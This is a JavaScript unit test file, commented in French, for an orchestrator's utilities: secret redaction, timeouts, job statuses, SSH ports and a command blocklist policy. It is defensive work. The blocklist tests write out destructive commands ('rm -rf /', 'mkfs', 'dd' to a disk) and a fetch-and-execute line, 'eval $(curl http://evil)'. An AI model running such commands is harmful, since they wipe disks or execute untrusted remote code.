/**
 * Tests unitaires P0 — orchestrator v11.3.0
 * Couvre : redact secrets, timeouts wait, statuts terminaux, port SSH, policies, escape.
 * Usage: node test_p0_unit.js
 */
import assert from 'assert';
import utils from './utils.js';
import policies from './policies.js';

let passed = 0;
let failed = 0;

function test(name, fn) {
    try {
        fn();
        passed++;
        console.log(`  ✅ ${name}`);
    } catch (e) {
        failed++;
        console.error(`  ❌ ${name}`);
        console.error(`     ${e.message}`);
    }
}

async function testAsync(name, fn) {
    try {
        await fn();
        passed++;
        console.log(`  ✅ ${name}`);
    } catch (e) {
        failed++;
        console.error(`  ❌ ${name}`);
        console.error(`     ${e.message}`);
    }
}

console.log('\n=== P0 unit tests (utils) ===\n');

test('escapeShellArg simple', () => {
    assert.strictEqual(utils.escapeShellArg('hello'), "'hello'");
});

test('escapeShellArg with quotes', () => {
    assert.strictEqual(utils.escapeShellArg("a'b"), "'a'\\''b'");
});

test('maskSecret long value keeps last 4', () => {
    assert.strictEqual(utils.maskSecret('sk-abcdefghijklmnop'), '***mnop');
});

test('maskSecret short value fully masked', () => {
    assert.strictEqual(utils.maskSecret('ab'), '***');
});

test('maskSecret nullish', () => {
    assert.strictEqual(utils.maskSecret(null), null);
    assert.strictEqual(utils.maskSecret(undefined), undefined);
});

test('redactSensitiveObject masks api_key and password', () => {
    const raw = {
        url: 'https://example.com',
        api_key: 'sk-super-secret-key-1234',
        nested: { htpasswd_pass: 'MyPassWord99', notes: 'ok' },
        password: 'root-secret'
    };
    const safe = utils.redactSensitiveObject(raw);
    assert.strictEqual(safe.url, 'https://example.com');
    assert.strictEqual(safe.nested.notes, 'ok');
    assert.ok(String(safe.api_key).startsWith('***'));
    assert.ok(!String(safe.api_key).includes('super-secret'));
    assert.ok(String(safe.password).startsWith('***'));
    assert.ok(String(safe.nested.htpasswd_pass).startsWith('***'));
    // original not mutated
    assert.strictEqual(raw.api_key, 'sk-super-secret-key-1234');
});

test('redactSensitiveObject array of apis', () => {
    const list = { a: { api_key: 'AAAA1111' }, b: { token: 'tokensecret99' } };
    const safe = utils.redactSensitiveObject(list);
    assert.ok(String(safe.a.api_key).startsWith('***'));
    assert.ok(String(safe.b.token).startsWith('***'));
});

test('toWaitTimeoutMs undefined → fallback ms', () => {
    assert.strictEqual(utils.toWaitTimeoutMs(undefined, 120000), 120000);
});

test('toWaitTimeoutMs 0 → infinite wait (0)', () => {
    assert.strictEqual(utils.toWaitTimeoutMs(0, 120000), 0);
});

test('toWaitTimeoutMs seconds → ms (P0 bugfix)', () => {
    // Ancien bug : 30 passé tel quel au lieu de 30000
    assert.strictEqual(utils.toWaitTimeoutMs(30, 120000), 30000);
    assert.strictEqual(utils.toWaitTimeoutMs(120, 999), 120000);
});

test('isTerminalJobStatus', () => {
    assert.strictEqual(utils.isTerminalJobStatus('completed'), true);
    assert.strictEqual(utils.isTerminalJobStatus('failed'), true);
    assert.strictEqual(utils.isTerminalJobStatus('partial'), true);
    assert.strictEqual(utils.isTerminalJobStatus('crashed'), true);
    assert.strictEqual(utils.isTerminalJobStatus('running'), false);
    assert.strictEqual(utils.isTerminalJobStatus('pending'), false);
});

test('resolveSshPort default 22', () => {
    assert.strictEqual(utils.resolveSshPort({}), 22);
    assert.strictEqual(utils.resolveSshPort(null), 22);
    assert.strictEqual(utils.resolveSshPort({ host: 'x' }), 22);
});

test('resolveSshPort custom', () => {
    assert.strictEqual(utils.resolveSshPort({ port: 2222 }), 2222);
    assert.strictEqual(utils.resolveSshPort({ port: '2222' }), 2222);
});

test('resolveSshPort invalid falls back', () => {
    assert.strictEqual(utils.resolveSshPort({ port: 0 }), 22);
    assert.strictEqual(utils.resolveSshPort({ port: 99999 }), 22);
    assert.strictEqual(utils.resolveSshPort({ port: 'nope' }), 22);
});

console.log('\n=== P0 unit tests (policies) ===\n');

await testAsync('blocklist: rm -rf / blocked', async () => {
    const r = policies.checkCommand('rm -rf /', ['rm -rf /', 'rm -rf /*']);
    assert.strictEqual(r.blocked, true);
});

await testAsync('blocklist: rm -rf /tmp NOT blocked (false positive fix)', async () => {
    const r = policies.checkCommand('rm -rf /tmp/foo', ['rm -rf /']);
    assert.strictEqual(r.blocked, false, `should not block /tmp, got ${JSON.stringify(r)}`);
});

await testAsync('blocklist: rm -rf /* blocked via glob pattern', async () => {
    const r = policies.checkCommand('rm -rf /*', ['rm -rf /*']);
    assert.strictEqual(r.blocked, true);
});

await testAsync('blocklist: eval $(curl blocked substring', async () => {
    const r = policies.checkCommand('eval $(curl http://evil)', ['eval $(curl']);
    assert.strictEqual(r.blocked, true);
});

await testAsync('blocklist: safe command passes', async () => {
    const r = policies.checkCommand('ls -la /home', ['rm -rf /', 'mkfs*']);
    assert.strictEqual(r.blocked, false);
});

await testAsync('blocklist: mkfs glob', async () => {
    const r = policies.checkCommand('mkfs.ext4 /dev/sda1', ['mkfs*']);
    assert.strictEqual(r.blocked, true);
});

await testAsync('policies.check uses default file (async)', async () => {
    const r = await policies.check('echo hello');
    assert.strictEqual(r.blocked, false);
});

await testAsync('policies.check blocks dangerous via file list', async () => {
    const r = await policies.check('rm -rf /');
    assert.strictEqual(r.blocked, true);
    assert.ok(r.pattern);
});

// Shell policy path simulation (same check shell uses)
await testAsync('shell_exec policy simulation: dangerous blocked', async () => {
    const r = await policies.check('dd if=/dev/zero of=/dev/sda');
    assert.strictEqual(r.blocked, true);
});

console.log('\n=== package version ===\n');

await testAsync('package.json version is 11.8.0', async () => {
    const { readFile } = await import('fs/promises');
    const pkg = JSON.parse(await readFile(new URL('./package.json', import.meta.url), 'utf8'));
    assert.strictEqual(pkg.version, '11.8.0');
});

console.log(`\n=== Results: ${passed} passed, ${failed} failed ===\n`);
process.exit(failed > 0 ? 1 : 0);
